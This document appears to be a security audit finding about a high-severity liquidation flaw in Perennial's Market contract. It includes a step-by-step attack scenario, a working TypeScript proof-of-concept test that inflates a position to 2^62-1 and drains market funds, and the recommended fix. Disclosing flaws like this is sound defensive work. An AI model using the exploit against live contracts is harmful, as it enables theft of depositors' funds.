---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/lending
  - sector/oracle
protocol: "[[Perennial]]"
auditors:
  - "[[panprog]]"
report: "https://github.com/sherlock-audit/2023-10-perennial-judging"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# H-1: Liquidator can liquidate user while increasing user position to any value, stealing all Market funds or bricking the contract

- id: 28948
- impact: HIGH
- protocol: [[Perennial]]
- reporter: [[panprog]] (Sherlock)
- source: N/A

## Summary


This bug report is about a vulnerability found in the Market contract of the Perennial Protocol. The vulnerability allows a malicious liquidator to liquidate a user while increasing their position to any value, including the maximum possible value of 2^62-1, which would result in all users losing all funds deposited into the Market. The vulnerability is caused by the fact that the `closable` value is calculated as the maximum possible position size that can be closed even if some pending position updates are invalidated due to an invalid oracle version. This means that it is possible for the user to have `closable = 0` while having the new (current) position size of any amount, which makes it possible for the malicious liquidator to liquidate the user while increasing their position size to any value.

Proof of concept code was provided to demonstrate the scenario, and a recommendation of adding a check to ensure that the order must decrease the position when liquidating was provided. This was resolved via a pull request on Github.

## Details

Source: https://github.com/sherlock-audit/2023-10-perennial-judging/issues/5 

## Found by 
panprog
## Summary

When a user is liquidated, there is a check to ensure that after liquidator order executes, `closable = 0`, but this actually doesn't prevent liquidator from increasing user position, and since all position size and collateral checks are skipped during liquidation, this allows malicious liquidator to open position of max possible size (`2^62-1`) during liquidation. Opening such huge position means the Market contract accounting is basically broken from this point without any ability to restore it. For example, the fee paid (and accumulated by makers) from opening such position will be higher than entire Market collateral balance, so any maker can withdraw full Market balance immediately after this position is settled.

`closable` is the value calculated as the maximum possible position size that can be closed even if some pending position updates are invalidated due to invalid oracle version. For example:

- Latest position = 10
- Pending position [t=200] = 0
- Pending position [t=300] = 1000

In such scenario `closable = 0` (regardless of position size at t=300).

## Vulnerability Detail

When position is liquidated (called `protected` in the code), the following requirements are enforced in `_invariant()`:
```solidity
if (protected && (
    !context.closable.isZero() || // @audit even if closable is 0, position can still increase
    context.latestPosition.local.maintained(
        context.latestVersion,
        context.riskParameter,
        context.pendingCollateral.sub(collateral)
    ) ||
    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))
)) revert MarketInvalidProtectionError();

if (
    !(context.currentPosition.local.magnitude().isZero() && context.latestPosition.local.magnitude().isZero()) &&   // sender has no position
    !(newOrder.isEmpty() && collateral.gte(Fixed6Lib.ZERO)) &&                                                      // sender is depositing zero or more into account, without position change
    (context.currentTimestamp - context.latestVersion.timestamp >= context.riskParameter.staleAfter)                // price is not stale
) revert MarketStalePriceError();

if (context.marketParameter.closed && newOrder.increasesPosition())
    revert MarketClosedError();

if (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit))
    revert MarketMakerOverLimitError();

if (!newOrder.singleSided(context.currentPosition.local) || !newOrder.singleSided(context.latestPosition.local))
    revert MarketNotSingleSidedError();

if (protected) return; // The following invariants do not apply to protected position updates (liquidations)
```

The requirements for liquidated positions are:
- closable = 0, user position collateral is below maintenance, liquidator withdraws no more than liquidation fee
- market oracle price is not stale
- for closed market - order doesn't increase position
- maker position doesn't exceed maker limit
- order and position are single-sided

All the other invariants are skipped for liquidation, including checks for long or short position size and collateral.

As shown in the example above, it's possible for the user to have `closable = 0` while having the new (current) position size of any amount, which makes it possible to succesfully liquidate user while increasing the position size (long or short) to any amount (up to max `2^62-1` enforced when storing position size values).

Scenario for opening any position size (oracle `granularity = 100`):
T=1: ETH price = $100. User opens position `long = 10` with collateral = min margin ($350)
T=120: Oracle version T=100 is commited, price = $100, user position is settled (becomes latest)
...
T=150: ETH price starts moving against the user, so the user tries to close the position calling `update(0,0,0,0,false)`
T=205: Current price is $92 and user becomes liquidatable (before the T=200 price is commited, so his close request is still pending). Liquidator commits unrequested oracle version T=190, price = $92, user is liquidated while increasing his position: `update(0,2^62-1,0,0,true)`
Liquidation succeeds, because user has latest long = 10, pending long = 0 (t=200), liquidation pending long = 2^62-1 (t=300). `closable = 0`.

## Impact

Malicious liquidator can liquidate users while increasing their position to any value including max possible 2^62-1 ignoring any collateral and position size checks. This is possible on its own, but liquidator can also craft such situation with very high probability. As a result of this action, all users will lose all their funds deposited into Market. For example, fee paid (and accured by makers) from max possible position will exceed total Market collateral balance so that the first maker will be able to withdraw all Market balance, minimal price change will create huge profit for the user, exceeding Market balance (if fee = 0) etc.

## Proof of concept

The scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:
```ts
it('liquidate with huge open position', async () => {
const positionMaker = parse6decimal('20.000')
const positionLong = parse6decimal('10.000')
const collateral = parse6decimal('1000')
const collateral2 = parse6decimal('350')
const maxPosition = parse6decimal('4611686018427') // 2^62-1

const oracleVersion = {
    price: parse6decimal('100'),
    timestamp: TIMESTAMP,
    valid: true,
}
oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)
oracle.status.returns([oracleVersion, TIMESTAMP + 100])
oracle.request.returns()

// maker
dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)
await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false)

// user opens long=10
dsu.transferFrom.whenCalledWith(user.address, market.address, collateral2.mul(1e12)).returns(true)
await market.connect(user).update(user.address, 0, positionLong, 0, collateral2, false)

const oracleVersion2 = {
    price: parse6decimal('100'),
    timestamp: TIMESTAMP + 100,
    valid: true,
}
oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2)
oracle.status.returns([oracleVersion2, TIMESTAMP + 200])
oracle.request.returns()

// price moves against user, so he's at the edge of liquidation and tries to close
// position: latest=10, pending [t=200] = 0 (closable = 0)
await market.connect(user).update(user.address, 0, 0, 0, 0, false)

const oracleVersion3 = {
    price: parse6decimal('92'),
    timestamp: TIMESTAMP + 190,
    valid: true,
}
oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3)
oracle.status.returns([oracleVersion3, TIMESTAMP + 300])
oracle.request.returns()

var loc = await market.locals(user.address);
var posLatest = await market.positions(user.address);
var posCurrent = await market.pendingPositions(user.address, loc.currentId);
console.log("Before liquidation. Latest= " + posLatest.long + " current = " + posCurrent.long);

// t = 205: price drops to 92, user becomes liquidatable before the pending position oracle version is commited
// liquidator commits unrequested price = 92 at oracle version=190, but current timestamp is already t=300
// liquidate. User pending positions:
//   latest = 10
//   pending [t=200] = 0
//   current(liquidated) [t=300] = max possible position (2^62-1)
await market.connect(user).update(user.address, 0, maxPosition, 0, 0, true)

var loc = await market.locals(user.address);
var posLatest = await market.positions(user.address);
var posCurrent = await market.pendingPositions(user.address, loc.currentId);
console.log("After liquidation. Latest= " + posLatest.long + " current = " + posCurrent.long);

})
```

## Code Snippet

`_processPendingPosition` calculates `context.closable` by taking latest position and reducing it any time pending order reduces position, and not changing it when pending order increases position, meaning a sequence like (10, 0, 1000000) will have `closable = 0`:
https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L253-L256

`_invariant` only checks `closable` for protected (liquidated) positions, ignoring order checks except for closed market:
https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L567-L592

## Tool used

Manual Review

## Recommendation

When liquidating, order must decrease position:
```solidity
if (protected && (
    !context.closable.isZero() || // @audit even if closable is 0, position can still increase
    context.latestPosition.local.maintained(
        context.latestVersion,
        context.riskParameter,
        context.pendingCollateral.sub(collateral)
    ) ||
-    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))
+    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder))) ||
+    newOrder.maker.add(newOrder.long).add(newOrder.short).gte(Fixed6Lib.ZERO)
)) revert MarketInvalidProtectionError();
```



## Discussion

**kbrizzle**

Resolved via: https://github.com/equilibria-xyz/perennial-v2/pull/149.
